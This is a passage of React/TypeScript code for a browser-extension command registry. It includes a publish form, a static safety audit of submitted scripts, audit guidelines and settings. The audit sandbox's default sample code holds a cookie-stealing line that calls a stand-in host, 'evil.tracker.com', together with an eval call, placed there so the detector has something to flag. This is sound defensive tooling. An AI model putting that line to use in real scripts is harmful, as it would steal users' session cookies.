                  <span>Audited: {auditReport.auditedAt}</span>
                </div>
              </div>

              <div className="audit-checklist">
                <h3>Static Review Checks</h3>
                <ChecklistItem
                  label="Host Scope Restrictions"
                  status={auditReport.checks.hostScope.status}
                  detail={auditReport.checks.hostScope.detail}
                />
                <ChecklistItem
                  label="Required API Permissions"
                  status={auditReport.checks.permissions.status}
                  detail={auditReport.checks.permissions.detail}
                />
                <ChecklistItem
                  label="Remote Code Loading"
                  status={auditReport.checks.remoteCode.status}
                  detail={auditReport.checks.remoteCode.detail}
                />
                <ChecklistItem
                  label="External Network Access"
                  status={auditReport.checks.networkAccess.status}
                  detail={auditReport.checks.networkAccess.detail}
                />
                <ChecklistItem
                  label="Obfuscation & Compilation"
                  status={auditReport.checks.obfuscation.status}
                  detail={auditReport.checks.obfuscation.detail}
                />
                <ChecklistItem
                  label="Package Signature & Integrity"
                  status={auditReport.checks.signature.status}
                  detail={auditReport.checks.signature.detail}
                />
              </div>
            </>
          ) : (
            <div className="no-audit">No audit report available for this command.</div>
          )}
        </div>
      )}

      {activeTab === 'publisher' && (
        <div className="tab-content publisher-tab">
          {publisherProfile ? (
            <>
              <div className="publisher-profile-card">
                <div className="publisher-avatar-large">
                  {publisherProfile.avatarInitials}
                </div>
                <div className="publisher-profile-info">
                  <h3>{publisherProfile.name}</h3>
                  <span className="publisher-handle">{publisherProfile.handle}</span>
                  {publisherProfile.verified ? (
                    <span className="verified-badge">✓ Verified Publisher</span>
                  ) : (
                    <span className="unverified-badge">Community Contributor</span>
                  )}
                </div>
              </div>

              {publisherProfile.bio && (
                <div className="publisher-section publisher-bio">
                  <h3>Biography</h3>
                  <p>{publisherProfile.bio}</p>
                </div>
              )}

              <div className="publisher-section publisher-stats-grid">
                <div>
                  <strong>{publisherProfile.publishedCommandsCount}</strong>
                  <span>Commands</span>
                </div>
                <div>
                  <strong>{new Date(publisherProfile.joinedAt).toLocaleDateString(undefined, { year: 'numeric', month: 'short' })}</strong>
                  <span>Member since</span>
                </div>
              </div>

              {publisherProfile.verifiedSources.length > 0 && (
                <div className="publisher-section publisher-sources">
                  <h3>Verified Sources</h3>
                  <ul>
                    {publisherProfile.verifiedSources.map((source) => (
                      <li key={source}>
                        <a href={`https://${source}`} target="_blank" rel="noopener noreferrer">
                          {source}
                        </a>
                      </li>
                    ))}
                  </ul>
                </div>
              )}
            </>
          ) : (
            <div className="no-publisher">No publisher profile details available.</div>
          )}
        </div>
      )}

      <div className="inspector-actions">
        <button
          className={`action-btn install-btn ${installedCommandIds.includes(command.id) ? 'is-installed' : ''}`}
          type="button"
          onClick={() => (installedCommandIds.includes(command.id) ? onUninstall(command.id) : onInstall(command))}
        >
          {installedCommandIds.includes(command.id) ? 'Installed' : 'Install'}
        </button>
        <button
          className={`action-btn pin-btn ${pinnedCommandIds.includes(command.id) ? 'is-pinned' : ''}`}
          type="button"
          disabled={!installedCommandIds.includes(command.id)}
          onClick={() => (pinnedCommandIds.includes(command.id) ? onUnpin(command.id) : onPin(command.id))}
        >
          {pinnedCommandIds.includes(command.id) ? 'Pinned' : 'Pin'}
        </button>
      </div>
    </aside>
  );
}

function ChecklistItem({
  label,
  status,
  detail,
}: {
  label: string;
  status: 'pass' | 'warning' | 'fail';
  detail: string;
}) {
  const statusIcon = {
    pass: '✓',
    warning: '⚠',
    fail: '✗',
  };

  return (
    <div className={`checklist-item check-${status}`}>
      <span className="check-icon">{statusIcon[status]}</span>
      <div className="check-copy">
        <strong>{label}</strong>
        <p>{detail}</p>
      </div>
    </div>
  );
}

interface PublishPanelProps {
  currentUser: RegistrySessionUser;
  onPublishSuccess: (newCommand: BurstCommand) => void;
  setNavTab: (tab: any) => void;
}

function PublishPanel({ currentUser, onPublishSuccess, setNavTab }: PublishPanelProps) {
  const isGuest = currentUser.handle === 'guest';

  if (isGuest) {
    return (
      <div className="publish-guest-panel">
        <div className="guest-warning-card">
          <span className="warning-icon">🔒</span>
          <h2>Authentication Required</h2>
          <p>You must be signed in as a verified publisher or community contributor to publish commands to the registry.</p>
          <p className="note">Use a <strong>Preview Profile</strong> in the sidebar to sign in instantly when GitHub OAuth is not configured in this environment.</p>
        </div>
      </div>
    );
  }

  const [title, setTitle] = useState('');
  const [id, setId] = useState('');
  const [description, setDescription] = useState('');
  const [website, setWebsite] = useState('');
  const [matchPattern, setMatchPattern] = useState('');
  const [sourceUrl, setSourceUrl] = useState('');
  const [code, setCode] = useState(`export default async function run({ page, toast }) {\n  // Write your command code here\n  toast("Hello from " + page.title);\n}`);
  const [permissions, setPermissions] = useState<string[]>([]);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleTitleChange = (val: string) => {
    setTitle(val);
    const slug = val
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, '-')
      .replace(/(^-|-$)/g, '');
    setId(slug);
  };

  const handlePermissionToggle = (perm: string) => {
    setPermissions((prev) =>
      prev.includes(perm) ? prev.filter((p) => p !== perm) : [...prev, perm]
    );
  };

  const parsedMatchPatterns = matchPattern
    .split(',')
    .map((p) => p.trim())
    .filter(Boolean);

  const auditResult = analyzeScriptCode(code, parsedMatchPatterns);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: Record<string, string> = {};
    if (!title.trim()) newErrors.title = 'Title is required';
    if (!id.trim()) newErrors.id = 'Command ID is required';
    if (!description.trim()) newErrors.description = 'Description is required';
    if (!website.trim()) newErrors.website = 'Website scope is required';
    if (!matchPattern.trim()) newErrors.matchPattern = 'Match pattern is required';
    if (!sourceUrl.trim()) {
      newErrors.sourceUrl = 'Source URL is required';
    } else if (!sourceUrl.startsWith('https://')) {
      newErrors.sourceUrl = 'Source URL must begin with https:// (secured origin)';
    }
    if (!code.trim()) newErrors.code = 'Source code is required';

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    const profileDetails = currentUser.handle === 'guest' ? undefined : currentUser;
    const isVerifiedSource = profileDetails?.verifiedSources?.some((source: string) =>
      sourceUrl.toLowerCase().includes(source.toLowerCase())
    ) ?? false;

    let trustLevel: BurstCommand['trustLevel'] = 'community';
    let riskLevel: BurstCommand['risk'] = 'low';

    if (auditResult.status === 'fail') {
      riskLevel = 'high';
      trustLevel = 'community';
    } else if (auditResult.status === 'warning') {
      riskLevel = 'medium';
      trustLevel = isVerifiedSource ? 'verified' : 'community';
    } else {
      riskLevel = 'low';
      trustLevel = isVerifiedSource ? 'verified' : 'community';
    }

    const finalPermissions = [...permissions];
    if (code.includes('page.') || code.includes('document.')) {
      if (!finalPermissions.includes('Read page DOM')) finalPermissions.push('Read page DOM');
    }
    if (code.includes('clipboard.write') || code.includes('writeText')) {
      if (!finalPermissions.includes('Write clipboard')) finalPermissions.push('Write clipboard');
    }
    if (code.includes('selection')) {
      if (!finalPermissions.includes('Read selection')) finalPermissions.push('Read selection');
    }
    if (code.includes('toast')) {
      if (!finalPermissions.includes('Toast alerts')) finalPermissions.push('Toast alerts');
    }
    if (code.includes('fetch') || code.includes('XMLHttpRequest')) {
      if (!finalPermissions.includes('Network access')) finalPermissions.push('Network access');
    }

    try {
      const payload = {
        id,
        title,
        description,
        website,
        matchPatterns: parsedMatchPatterns,
        publisherHandle: currentUser.handle,
        trustLevel,
        risk: riskLevel,
        permissions: finalPermissions.length > 0 ? finalPermissions : ['None'],
        sourceUrl,
        icon: { type: 'initials', value: title.substring(0, 2).toUpperCase() },
        code,
        version: '1.0.0',
      };
      const newCommand = await publishCommand(payload);
      onPublishSuccess(newCommand);
    } catch (err) {
      setErrors({ form: err instanceof Error ? err.message : 'Failed to publish command' });
    }
  };

  return (
    <div className="publish-wizard-container">
      <div className="wizard-header">
        <h1>Publish a new command</h1>
        <p>Define manifest capabilities, declare host scopes, and write the execution block.</p>
      </div>

      <form onSubmit={handleSubmit} className="publish-form-layout">
        {errors.form && (
          <div
            className="form-error-banner"
            style={{
              color: 'var(--red)',
              background: 'rgba(239, 68, 68, 0.1)',
              padding: '12px',
              borderRadius: '6px',
              marginBottom: '16px',
              fontSize: '14px',
              border: '1px solid rgba(239, 68, 68, 0.2)',
              gridColumn: 'span 2',
            }}
          >
            {errors.form}
          </div>
        )}
        <div className="form-main">
          <div className="form-group-row">
            <div className="form-field title-field">
              <span>Title</span>
              <input
                value={title}
                onChange={(e) => handleTitleChange(e.target.value)}
                placeholder="e.g. Copy GitHub branch name"
              />
              {errors.title && <span className="field-error">{errors.title}</span>}
            </div>

            <div className="form-field id-field">
              <span>Command ID</span>
              <input
                value={id}
                onChange={(e) => setId(e.target.value)}
                placeholder="e.g. copy-github-branch"
              />
              {errors.id && <span className="field-error">{errors.id}</span>}
            </div>
          </div>

          <div className="form-field">
            <span>Description</span>
            <textarea
              value={description}
              onChange={(e) => setDescription(e.target.value)}
              placeholder="Provide a clear description of the command and its features..."
              rows={3}
            />
            {errors.description && <span className="field-error">{errors.description}</span>}
          </div>

          <div className="form-group-row">
            <div className="form-field">
              <span>Target Website (Friendly Name)</span>
              <input
                value={website}
                onChange={(e) => setWebsite(e.target.value)}
                placeholder="e.g. github.com or all sites"
              />
              {errors.website && <span className="field-error">{errors.website}</span>}
            </div>

            <div className="form-field">
              <span>Match Pattern (comma separated)</span>
              <input
                value={matchPattern}
                onChange={(e) => setMatchPattern(e.target.value)}
                placeholder="e.g. github.com/*, *://*.github.com/*"
              />
              {errors.matchPattern && <span className="field-error">{errors.matchPattern}</span>}
            </div>
          </div>

          <div className="form-field">
            <span>Secure Source URL (Git Repository / Gist)</span>
            <input
              value={sourceUrl}
              onChange={(e) => setSourceUrl(e.target.value)}
              placeholder="https://github.com/username/repo"
            />
            <span className="field-hint">Used for publisher verification checks. Must match verified sources.</span>
            {errors.sourceUrl && <span className="field-error">{errors.sourceUrl}</span>}
          </div>

          <div className="form-field permissions-checklist-field">
            <span>Explicit Permission Declarations</span>
            <div className="permissions-checkboxes">
              {['Read page DOM', 'Write clipboard', 'Read selection', 'Toast alerts', 'Network access'].map((perm) => (
                <label key={perm} className="permission-checkbox-label">
                  <input
                    type="checkbox"
                    checked={permissions.includes(perm)}
                    onChange={() => handlePermissionToggle(perm)}
                  />
                  <span>{perm}</span>
                </label>
              ))}
            </div>
          </div>

          <div className="form-field code-field">
            <span>Source Code (ES Module)</span>
            <textarea
              className="code-textarea"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="export default async function run(context) { ... }"
              rows={12}
            />
            {errors.code && <span className="field-error">{errors.code}</span>}
          </div>

          <div className="form-actions">
            <button type="submit" className="btn-primary">Publish Command</button>
            <button type="button" className="btn-secondary" onClick={() => setNavTab('Discover')}>Cancel</button>
          </div>
        </div>

        <div className="form-sidebar">
          <div className="live-audit-panel">
            <h3>Live Safety Audit</h3>
            <div className="audit-header">
              <span className={`audit-overall-status badge-${auditResult.status}`}>
                {auditResult.status.toUpperCase()}
              </span>
              <span className="audit-title">Pre-release scan</span>
            </div>
            <p className="audit-summary">{auditResult.summary}</p>

            <div className="live-checklist">
              <LiveCheckItem
                label="Host Scope Restrictions"
                status={auditResult.checks.hostScope.status}
                detail={auditResult.checks.hostScope.detail}
              />
              <LiveCheckItem
                label="Required API Permissions"
                status={auditResult.checks.permissions.status}
                detail={auditResult.checks.permissions.detail}
              />
              <LiveCheckItem
                label="Remote Code Loading"
                status={auditResult.checks.remoteCode.status}
                detail={auditResult.checks.remoteCode.detail}
              />
              <LiveCheckItem
                label="External Network Access"
                status={auditResult.checks.networkAccess.status}
                detail={auditResult.checks.networkAccess.detail}
              />
              <LiveCheckItem
                label="Obfuscation & Compilation"
                status={auditResult.checks.obfuscation.status}
                detail={auditResult.checks.obfuscation.detail}
              />
            </div>
          </div>
        </div>
      </form>
    </div>
  );
}

function LiveCheckItem({ label, status, detail }: { label: string; status: 'pass' | 'warning' | 'fail'; detail: string }) {
  const icon = { pass: '✓', warning: '⚠', fail: '✗' }[status];
  return (
    <div className={`live-check-item check-${status}`}>
      <span className="check-icon">{icon}</span>
      <div className="check-text">
        <strong>{label}</strong>
        <p>{detail}</p>
      </div>
    </div>
  );
}

function AuditsPanel() {
  const [testCode, setTestCode] = useState(`// Paste code here to verify static analysis triggers\n\nconst token = "api-key-xyz";\nfetch("https://evil.tracker.com/steal?data=" + document.cookie);\n\neval("console.log('remote eval!')");`);
  const [patterns, setPatterns] = useState('<all_urls>');

  const report = analyzeScriptCode(testCode, patterns.split(',').map((p) => p.trim()));

  return (
    <div className="audits-dashboard">
      <div className="dashboard-header">
        <h1>Static Security Audits</h1>
        <p>Inspect the guidelines, security parameters, and analyze custom execution script blocks.</p>
      </div>

      <div className="dashboard-grid">
        <div className="audit-tester-section">
          <h2>Interactive Audit Sandbox</h2>
          <p className="subtitle">Paste or edit code below to instantly inspect rule triggers and risk metrics.</p>

          <div className="form-field">
            <span>Match Patterns</span>
            <input value={patterns} onChange={(e) => setPatterns(e.target.value)} />
          </div>

          <div className="form-field">
            <span>Script Code Block</span>
            <textarea
              className="code-textarea"
              value={testCode}
              onChange={(e) => setTestCode(e.target.value)}
              rows={10}
            />
          </div>

          <div className="tester-audit-report">
            <div className="report-header">
              <h3>Sandbox Analysis Report</h3>
              <span className={`trust-badge trust-${report.status === 'pass' ? 'verified' : report.status === 'warning' ? 'community' : 'flagged'}`}>
                {report.status.toUpperCase()}
              </span>
            </div>
            <p className="report-summary">{report.summary}</p>
            <div className="audit-checklist">
              <ChecklistItem label="Host Scope Restrictions" status={report.checks.hostScope.status} detail={report.checks.hostScope.detail} />
              <ChecklistItem label="Required API Permissions" status={report.checks.permissions.status} detail={report.checks.permissions.detail} />
              <ChecklistItem label="Remote Code Loading" status={report.checks.remoteCode.status} detail={report.checks.remoteCode.detail} />
              <ChecklistItem label="External Network Access" status={report.checks.networkAccess.status} detail={report.checks.networkAccess.detail} />
              <ChecklistItem label="Obfuscation & Compilation" status={report.checks.obfuscation.status} detail={report.checks.obfuscation.detail} />
            </div>
          </div>
        </div>

        <div className="guidelines-section">
          <h2>Static Heuristic Audit Guidelines</h2>
          <p className="subtitle">Burst registry runs an automated static checker mapping scripts to their security postures.</p>

          <div className="guideline-card">
            <h3>🟢 PASS Status</h3>
            <p>Scripts restricted to explicit scopes, requesting no broad permissions, with visible, non-obfuscated operations and zero network dependencies.</p>
          </div>

          <div className="guideline-card">
            <h3>🟡 WARNING Status</h3>
            <p>Triggered by medium-risk APIs like clipboard writes, localStorage reading, outbound fetch requests, and obfuscation keywords. Broad match patterns like <code>&lt;all_urls&gt;</code> also warrant verification.</p>
          </div>

          <div className="guideline-card">
            <h3>🔴 FAIL Status</h3>
            <p>Triggered by dangerous features that compromise user privacy. This includes accessing session cookies, Chrome storage APIs, reading clipboard content without action, script-tag creations, and direct string execution via <code>eval()</code>.</p>
          </div>
        </div>
      </div>
    </div>
  );
}

function SettingsPanel() {
  const [darkMode, setDarkMode] = useState(() => {
    return document.documentElement.getAttribute('data-theme') === 'dark' || localStorage.getItem('burst-theme') === 'dark';
  });
  const [autoUpdate, setAutoUpdate] = useState(true);

  const toggleTheme = () => {
    const nextTheme = !darkMode ? 'dark' : 'light';
    setDarkMode(!darkMode);
    document.documentElement.setAttribute('data-theme', nextTheme);
    localStorage.setItem('burst-theme', nextTheme);
  };

  const handleResetStorage = () => {
    if (confirm('Are you sure you want to clear simulated installation states? This will uninstall all packages from this window.')) {
      window.postMessage({ type: 'burst:uninstall-command', commandId: '*' }, '*');
      localStorage.removeItem('burst.installedRegistryCommands.v1');
      localStorage.removeItem('burst.pinnedRegistryCommands.v1');
      alert('Installation caches cleared.');
      window.location.reload();
    }
  };

  return (
    <div className="settings-panel">
      <div className="settings-header">
        <h1>Registry Settings</h1>
        <p>Configure interface options, developer tools, and view synchronization posture.</p>
      </div>

      <div className="settings-section-card">
        <h2>Interface Preferences</h2>
        <div className="setting-row">
          <div className="setting-info">
            <strong>Dark Color Scheme</strong>
            <span>Toggle between high-contrast dark mode and premium light theme.</span>
          </div>
          <button className="toggle-btn" onClick={toggleTheme} type="button">
            {darkMode ? 'Dark Mode On' : 'Light Mode On'}
          </button>
        </div>
      </div>

      <div className="settings-section-card">
        <h2>Extension Connectivity</h2>
        <div className="setting-row">
          <div className="setting-info">
            <strong>Burst Bridge Connection</strong>
            <span>Shows current handshake state with the local browser extension context.</span>
          </div>
          <span className="badge-connected">✓ CONNECTED</span>
        </div>
        <div className="setting-row">
          <div className="setting-info">
            <strong>Background Live Update Sync</strong>
            <span>Automatically propagate newly installed commands directly into extension memory.</span>
          </div>
          <button className={`toggle-btn ${autoUpdate ? 'is-active' : ''}`} onClick={() => setAutoUpdate(!autoUpdate)} type="button">
            {autoUpdate ? 'Enabled' : 'Disabled'}
          </button>
        </div>
      </div>

      <div className="settings-section-card">
        <h2>Developer & System Actions</h2>
        <div className="setting-row">
          <div className="setting-info">
            <strong>Clear Cache States</strong>
            <span>Purge extension installed registry script mapping keys from browser storage.</span>
          </div>
          <button className="danger-btn" onClick={handleResetStorage} type="button">
            Reset Installed Cache
          </button>
        </div>
      </div>
    </div>
  );
}
